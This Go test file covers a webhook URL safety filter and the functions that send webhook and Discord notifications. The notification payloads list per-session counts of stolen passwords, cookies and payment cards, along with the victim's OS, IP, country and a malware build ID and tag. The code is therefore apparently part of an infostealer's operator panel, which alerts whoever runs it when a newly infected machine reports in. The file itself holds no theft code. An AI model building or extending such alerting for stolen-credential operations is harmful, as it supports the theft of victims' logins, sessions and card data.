package services

import (
	"net"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
)

// localServer starts an httptest server bound to "localhost" and returns
// its URL with the hostname spelled out (isSafeWebhookURL blocks loopback
// IPs, and httptest's default URL uses 127.0.0.1 on Windows).
func localServer(t *testing.T, handler http.HandlerFunc) string {
	t.Helper()
	ln, err := net.Listen("tcp", "localhost:0")
	if err != nil {
		t.Fatal(err)
	}
	ts := httptest.NewUnstartedServer(handler)
	ts.Listener = ln
	ts.Start()
	t.Cleanup(ts.Close)
	port := ln.Addr().(*net.TCPAddr).Port
	return "http://localhost:" + strconv.Itoa(port)
}

func TestIsSafeWebhookURL(t *testing.T) {
	tests := []struct {
		url  string
		safe bool
	}{
		{"https://example.com/webhook", true},
		{"http://localhost:8080/hook", true},
		{"http://127.0.0.1:8080/hook", false},
		{"http://[::1]:8080/hook", false},
		{"http://example.com/hook", false},
		{"http://192.168.1.1/hook", false},
		{"http://10.0.0.1/hook", false},
		{"http://169.254.169.254/hook", false},
		{"http://foo.local/hook", false},
		{"https://foo.local/hook", false},
		{"http://1.2.3.4/hook", false},
		{"https://1.2.3.4/hook", true},
		{"https://192.168.1.1/hook", false},
		{"::not-a-url::", false},
	}
	for _, tc := range tests {
		got := isSafeWebhookURL(tc.url)
		if got != tc.safe {
			t.Errorf("isSafeWebhookURL(%q) = %v, want %v", tc.url, got, tc.safe)
		}
	}
}

func TestSendWebhookNotification_Success(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	payload := WebhookPayload{
		SessionID:   "test-session-001",
		CountryCode: "US",
		Passwords:   5,
		Cookies:     10,
	}
	if err := SendWebhookNotification(ts, payload); err != nil {
		t.Fatal(err)
	}
}

func TestSendWebhookNotification_ServerError(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	})
	err := SendWebhookNotification(ts, WebhookPayload{SessionID: "test"})
	if err == nil || !strings.Contains(err.Error(), "500") {
		t.Fatalf("expected status error, got: %v", err)
	}
}

func TestSendWebhookNotification_UnsafeURL(t *testing.T) {
	err := SendWebhookNotification("http://192.168.1.1/hook", WebhookPayload{SessionID: "test"})
	if err == nil || !strings.Contains(err.Error(), "not allowed") {
		t.Fatalf("expected not-allowed error, got: %v", err)
	}
}

func TestSendWebhookNotification_NetworkError(t *testing.T) {
	err := SendWebhookNotification("http://localhost:1/hook", WebhookPayload{SessionID: "test"})
	if err == nil || !strings.Contains(err.Error(), "send webhook") {
		t.Fatalf("expected send error, got: %v", err)
	}
}

func TestSendDiscordNotification_Success(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	session := SessionSummary{
		SessionID:   "test-session-001",
		CountryCode: "US",
		Passwords:   5,
		Cookies:     10,
		Cards:       2,
		Os:          "win11",
		IP:          "1.2.3.4",
		BuildID:     "b-1",
	}
	if err := SendDiscordNotification(ts, session); err != nil {
		t.Fatal(err)
	}
}

func TestSendDiscordNotification_WithBuildTag(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	session := SessionSummary{
		SessionID:   "test-session-001",
		CountryCode: "US",
		Passwords:   5,
		Cookies:     10,
		Cards:       2,
		Os:          "win11",
		IP:          "1.2.3.4",
		BuildID:     "b-1",
		BuildTag:    "v2.1",
	}
	if err := SendDiscordNotification(ts, session); err != nil {
		t.Fatal(err)
	}
}

func TestSendDiscordNotification_OrangeColor(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	})
	session := SessionSummary{
		SessionID:   "test-session-002",
		CountryCode: "DE",
		Os:          "macos",
		IP:          "5.6.7.8",
		BuildID:     "b-2",
	}
	if err := SendDiscordNotification(ts, session); err != nil {
		t.Fatal(err)
	}
}

func TestSendDiscordNotification_ServerError(t *testing.T) {
	ts := localServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
	})
	err := SendDiscordNotification(ts, SessionSummary{SessionID: "test-session-004"})
	if err == nil || !strings.Contains(err.Error(), "502") {
		t.Fatalf("expected status error, got: %v", err)
	}
}

func TestSendDiscordNotification_UnsafeURL(t *testing.T) {
	err := SendDiscordNotification("http://192.168.1.1/hook", SessionSummary{SessionID: "test-session-003"})
	if err == nil {
		t.Fatal("expected error for unsafe URL")
	}
}

func TestSendDiscordNotification_NetworkError(t *testing.T) {
	err := SendDiscordNotification("http://localhost:1/discord", SessionSummary{SessionID: "test-session-003"})
	if err == nil {
		t.Fatal("expected error for unreachable server")
	}
}